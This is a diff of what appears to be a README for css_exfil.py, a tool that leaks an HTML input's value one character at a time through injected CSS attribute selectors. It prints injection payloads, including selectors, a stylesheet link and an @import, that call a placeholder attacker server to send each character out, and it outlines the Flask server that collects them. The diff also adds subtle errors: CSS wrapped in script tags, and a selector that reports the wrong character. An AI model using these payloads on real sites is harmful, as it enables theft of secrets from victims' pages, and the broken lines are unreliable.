@@ -8,29 +8,37 @@ Let's say you want to exfiltrate the value of the `value` attribute:
 <input type="text" id="name" value="S3cr3t">
 ```
 What you need to do is inject a bunch of [CSS attribute selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors), each matching a value starting with a different character:
-```CSS
+```HTML
+<style>
 input#name[value^="a"] { background: url("http://myip:myport/reveal?c=a"); }
 input#name[value^="b"] { background: url("http://myip:myport/reveal?c=b"); }
 ...
 input#name[value^="S"] { background: url("http://myip:myport/reveal?c=S"); }
 ...
+</style>
 ```
-It can be done either by injecting the payload above directly into the victim's document, or by injecting a link to your own web server, which will respond with the same payload:
+It can be done either by injecting the payload above directly into the victim's document, or by injecting a link to your own web server, which will respond with the same payload (without the `<style>` tags):
 ```HTML
 <link rel="stylesheet" href="http://myip:myport/evil.css">
 ```
-Only one the CSS selectors will match, and it will trigger a `GET` request to your server to load the corresponding background image. In this case, you will receive the following request:
+It can also be done using CSS imports:
+```HTML
+<style>@import url("http://myip:myport/evil.css");</style>
+```
+Either way, only one the CSS selectors will match, and it will trigger a `GET` request to your server to load the corresponding background image. In this case, you will receive the following request:
 ```
 GET /reveal?c=S HTTP/1.1
 ...
 ```
 You've read the first character. You can repeat the process to read the second character using this payload:
-```CSS
+```HTML
+<script>
 input#name[value^="Sa"] { background: url("http://myip:myport/reveal?c=a"); }
 input#name[value^="Sb"] { background: url("http://myip:myport/reveal?c=b"); }
 ...
 input#name[value^="S3"] { background: url("http://myip:myport/reveal?c=S"); }
 ...
+</script>
 ```
 # The Script
 The `css_exfil.py` script automates this process. It uses [Flask](https://palletsprojects.com/p/flask/) to serve the payloads and retrieve the exfiltrated characters. A request to `/evil.css` returns the set of CSS attribute selectors that is used to reveal the next character. A request to `/reveal?c=x` (made to retrieve the background image) returns a 404 error and adds `x` to the exfiltrated secret. It two consecutive requests are made to the `/evil.css` URL with no `/reveal` request in between then it means the last set of CSS attribute selectors haven't matched anything, and the secret has been read completely.
